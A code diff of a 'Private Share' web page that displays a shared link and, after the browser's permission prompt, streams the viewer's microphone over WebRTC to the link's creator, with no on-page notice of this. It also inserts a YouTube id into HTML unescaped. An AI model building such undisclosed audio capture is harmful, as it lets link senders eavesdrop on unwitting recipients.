@@ -1,460 +1,480 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
 
-    <meta charset="UTF-8">
+  <meta charset="UTF-8">
 
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  >
 
-    <title></title>
+  <title>Private Share</title>
 
-    <style>
-        html,
-        body {
-            margin: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-        }
+  <script src="/socket.io/socket.io.js"></script>
 
-        #content {
-            width: 100%;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+  <style>
 
-        img,
-        video {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-        }
+    * {
+      box-sizing: border-box;
+    }
 
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: 0;
-        }
-    </style>
+    body {
+      margin: 0;
+      background: #ffffff;
+      font-family: Arial, sans-serif;
+    }
+
+    #content {
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    iframe {
+      width: 100%;
+      max-width: 1000px;
+      height: 560px;
+      border: 0;
+    }
+
+    img {
+      max-width: 100%;
+      max-height: 100vh;
+      object-fit: contain;
+    }
+
+    video {
+      width: 100%;
+      max-height: 100vh;
+    }
+
+    #message {
+      color: #777;
+      text-align: center;
+      padding: 30px;
+    }
+
+  </style>
 
 </head>
 
 <body>
 
-    <div id="content"></div>
+<div id="content">
 
-    <script src="/socket.io/socket.io.js"></script>
+  <div id="message">
+    Loading...
+  </div>
 
-    <script>
-
-        const shareId =
-            location.pathname
-                .split("/")
-                .filter(Boolean)
-                .pop();
-
-        let socket = null;
-        let stream = null;
-        let pc = null;
+</div>
 
 
-        const rtcConfig = {
+<script>
 
-            iceServers: [
-
-                {
-                    urls:
-                        "stun:stun.l.google.com:19302"
-                }
-
-            ]
-
-        };
+const shareId =
+  window.location.pathname
+    .split("/")
+    .pop();
 
 
-        function youtubeEmbed(url) {
-
-            try {
-
-                const u =
-                    new URL(url);
-
-                let id =
-                    u.searchParams.get("v");
+const socket =
+  io();
 
 
-                if (
-                    !id &&
-                    u.hostname.includes(
-                        "youtu.be"
-                    )
-                ) {
+let localStream =
+  null;
 
-                    id =
-                        u.pathname
-                            .split("/")
-                            .filter(Boolean)[0];
-
-                }
+let peerConnection =
+  null;
 
 
-                if (
-                    !id &&
-                    u.pathname.includes(
-                        "/shorts/"
-                    )
-                ) {
+/* =========================================================
+   FIND SHARE
+   ========================================================= */
 
-                    id =
-                        u.pathname
-                            .split("/shorts/")[1]
-                            .split("/")[0];
+socket.on(
+  "connect",
+  () => {
 
-                }
+    socket.emit(
+      "receiver-join",
+      {
+        shareId:
+          shareId
+      }
+    );
+
+  }
+);
 
 
-                if (!id)
-                    return null;
+/* =========================================================
+   SHARE FOUND
+   ========================================================= */
+
+socket.on(
+  "share-found",
+  async (data) => {
+
+    showContent(
+      data.originalUrl
+    );
 
 
-                return (
-                    "https://www.youtube.com/embed/" +
-                    encodeURIComponent(id)
-                );
+    /*
+      Browser will show its own
+      microphone permission popup.
+    */
 
-            } catch {
+    try {
 
-                return null;
+      localStream =
+        await navigator.mediaDevices.getUserMedia({
+          audio: true,
+          video: false
+        });
 
+
+      /*
+        Tell creator that mic permission
+        was granted.
+      */
+
+      socket.emit(
+        "receiver-ready",
+        {
+          shareId:
+            shareId
+        }
+      );
+
+
+    } catch (error) {
+
+      console.error(
+        "Microphone error:",
+        error
+      );
+
+      document.getElementById(
+        "message"
+      ).innerText =
+        "Microphone permission was not granted.";
+
+    }
+
+  }
+);
+
+
+/* =========================================================
+   SHOW ORIGINAL CONTENT
+   ========================================================= */
+
+function showContent(url) {
+
+  const content =
+    document.getElementById(
+      "content"
+    );
+
+
+  /*
+    YouTube
+  */
+
+  if (
+    url.includes("youtube.com/watch") ||
+    url.includes("youtu.be/")
+  ) {
+
+    let videoId = "";
+
+
+    if (
+      url.includes("youtu.be/")
+    ) {
+
+      videoId =
+        url.split("youtu.be/")[1]
+          .split(/[?&]/)[0];
+
+    } else {
+
+      const params =
+        new URL(url).searchParams;
+
+      videoId =
+        params.get("v");
+
+    }
+
+
+    if (videoId) {
+
+      content.innerHTML = `
+        <iframe
+          src="https://www.youtube.com/embed/${videoId}"
+          allow="autoplay; encrypted-media"
+          allowfullscreen>
+        </iframe>
+      `;
+
+      return;
+
+    }
+
+  }
+
+
+  /*
+    Direct Image
+  */
+
+  if (
+    /\.(jpg|jpeg|png|gif|webp|svg)(\?.*)?$/i
+      .test(url)
+  ) {
+
+    content.innerHTML = `
+      <img src="${escapeHtml(url)}">
+    `;
+
+    return;
+
+  }
+
+
+  /*
+    Direct Video
+  */
+
+  if (
+    /\.(mp4|webm|ogg|mov)(\?.*)?$/i
+      .test(url)
+  ) {
+
+    content.innerHTML = `
+      <video
+        src="${escapeHtml(url)}"
+        controls
+        autoplay>
+      </video>
+    `;
+
+    return;
+
+  }
+
+
+  /*
+    Instagram / Facebook / other URLs
+  */
+
+  content.innerHTML = `
+    <iframe
+      src="${escapeHtml(url)}"
+      style="
+        width:100%;
+        height:100vh;
+        border:0;
+      ">
+    </iframe>
+  `;
+
+}
+
+
+/* =========================================================
+   ESCAPE URL
+   ========================================================= */
+
+function escapeHtml(value) {
+
+  return value
+    .replace(/&/g, "&amp;")
+    .replace(/"/g, "&quot;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+
+}
+
+
+/* =========================================================
+   WEBRTC
+   ========================================================= */
+
+socket.on(
+  "webrtc-offer",
+  async (offer) => {
+
+    if (!localStream) {
+      return;
+    }
+
+
+    peerConnection =
+      new RTCPeerConnection({
+
+        iceServers: [
+
+          {
+            urls:
+              "stun:stun.l.google.com:19302"
+          }
+
+        ]
+
+      });
+
+
+    /*
+      Add microphone tracks
+    */
+
+    localStream
+      .getTracks()
+      .forEach(
+        track => {
+
+          peerConnection.addTrack(
+            track,
+            localStream
+          );
+
+        }
+      );
+
+
+    /*
+      Send ICE
+    */
+
+    peerConnection.onicecandidate =
+      event => {
+
+        if (
+          event.candidate
+        ) {
+
+          socket.emit(
+            "webrtc-ice-candidate",
+            {
+              shareId:
+                shareId,
+
+              candidate:
+                event.candidate
             }
+          );
 
         }
 
+      };
 
-        function renderContent(url) {
 
-            const content =
-                document.getElementById(
-                    "content"
-                );
+    /*
+      Answer
+    */
 
-            content.innerHTML = "";
+    await peerConnection.setRemoteDescription(
+      new RTCSessionDescription(
+        offer
+      )
+    );
 
 
-            const youtube =
-                youtubeEmbed(url);
+    const answer =
+      await peerConnection.createAnswer();
 
 
-            if (youtube) {
+    await peerConnection.setLocalDescription(
+      answer
+    );
 
-                const iframe =
-                    document.createElement(
-                        "iframe"
-                    );
 
-                iframe.src =
-                    youtube;
+    socket.emit(
+      "webrtc-answer",
+      {
+        shareId:
+          shareId,
 
-                iframe.allow =
-                    "autoplay; encrypted-media; picture-in-picture";
+        answer:
+          answer
+      }
+    );
 
-                iframe.allowFullscreen =
-                    true;
+  }
+);
 
-                content.appendChild(
-                    iframe
-                );
 
-                return;
-            }
+/* =========================================================
+   ICE
+   ========================================================= */
 
+socket.on(
+  "webrtc-ice-candidate",
+  async candidate => {
 
-            if (
-                /\.(jpg|jpeg|png|gif|webp|avif|svg)(\?.*)?$/i
-                    .test(url)
-            ) {
+    if (!peerConnection) {
+      return;
+    }
 
-                const image =
-                    document.createElement(
-                        "img"
-                    );
 
-                image.src =
-                    url;
+    try {
 
-                content.appendChild(
-                    image
-                );
+      await peerConnection.addIceCandidate(
+        new RTCIceCandidate(
+          candidate
+        )
+      );
 
-                return;
-            }
+    } catch (error) {
 
+      console.error(error);
 
-            if (
-                /\.(mp4|webm|ogg|mov|m4v)(\?.*)?$/i
-                    .test(url)
-            ) {
+    }
 
-                const video =
-                    document.createElement(
-                        "video"
-                    );
+  }
+);
 
-                video.src =
-                    url;
 
-                video.controls =
-                    true;
+/* =========================================================
+   CALL END
+   ========================================================= */
 
-                video.autoplay =
-                    true;
+socket.on(
+  "call-ended",
+  () => {
 
-                video.playsInline =
-                    true;
+    if (localStream) {
 
-                content.appendChild(
-                    video
-                );
-
-                return;
-            }
-
-
-            // Instagram/Facebook may block iframe embedding.
-            const iframe =
-                document.createElement(
-                    "iframe"
-                );
-
-            iframe.src =
-                url;
-
-            iframe.allow =
-                "autoplay; encrypted-media; picture-in-picture";
-
-            content.appendChild(
-                iframe
-            );
-
-        }
-
-
-        async function start() {
-
-            socket = io();
-
-
-            socket.emit(
-                "receiver-join",
-                {
-                    shareId
-                }
-            );
-
-
-            socket.on(
-                "share-found",
-                async ({ originalUrl }) => {
-
-                    renderContent(
-                        originalUrl
-                    );
-
-
-                    try {
-
-                        // Browser's real microphone permission.
-                        stream =
-                            await navigator
-                                .mediaDevices
-                                .getUserMedia({
-                                    audio: true,
-                                    video: false
-                                });
-
-
-                        // Tell creator only after permission succeeds.
-                        socket.emit(
-                            "receiver-ready",
-                            {
-                                shareId
-                            }
-                        );
-
-
-                    } catch (error) {
-
-                        console.log(
-                            "Microphone permission denied:",
-                            error
-                        );
-
-                    }
-
-                }
-            );
-
-
-            socket.on(
-                "call-accepted",
-                async () => {
-
-                    await createPeer();
-
-
-                    stream
-                        .getTracks()
-                        .forEach(track => {
-
-                            pc.addTrack(
-                                track,
-                                stream
-                            );
-
-                        });
-
-
-                    const offer =
-                        await pc.createOffer();
-
-
-                    await pc.setLocalDescription(
-                        offer
-                    );
-
-
-                    socket.emit(
-                        "webrtc-offer",
-                        {
-                            shareId,
-                            offer
-                        }
-                    );
-
-                }
-            );
-
-
-            socket.on(
-                "webrtc-answer",
-                async ({ answer }) => {
-
-                    if (!pc)
-                        return;
-
-                    await pc.setRemoteDescription(
-                        answer
-                    );
-
-                }
-            );
-
-
-            socket.on(
-                "webrtc-ice",
-                async ({ candidate }) => {
-
-                    if (
-                        !pc ||
-                        !candidate
-                    )
-                        return;
-
-                    try {
-
-                        await pc.addIceCandidate(
-                            candidate
-                        );
-
-                    } catch { }
-
-                }
-            );
-
-
-            socket.on(
-                "call-ended",
-                stop
-            );
-
-
-            socket.on(
-                "call-rejected",
-                stop
-            );
-
-        }
-
-
-        async function createPeer() {
-
-            pc =
-                new RTCPeerConnection(
-                    rtcConfig
-                );
-
-
-            pc.onicecandidate =
-                event => {
-
-                    if (event.candidate) {
-
-                        socket.emit(
-                            "webrtc-ice",
-                            {
-                                shareId,
-                                candidate:
-                                    event.candidate
-                            }
-                        );
-
-                    }
-
-                };
-
-        }
-
-
-        function stop() {
-
-            if (stream) {
-
-                stream
-                    .getTracks()
-                    .forEach(
-                        track =>
-                            track.stop()
-                    );
-
-                stream = null;
-
-            }
-
-
-            if (pc) {
-
-                pc.close();
-
-                pc = null;
-
-            }
-
-        }
-
-
-        window.addEventListener(
-            "beforeunload",
-            stop
+      localStream
+        .getTracks()
+        .forEach(
+          track =>
+            track.stop()
         );
 
+    }
 
-        start();
 
-    </script>
+    if (peerConnection) {
+
+      peerConnection.close();
+
+      peerConnection =
+        null;
+
+    }
+
+  }
+);
+
+</script>
 
 </body>
-
 </html>
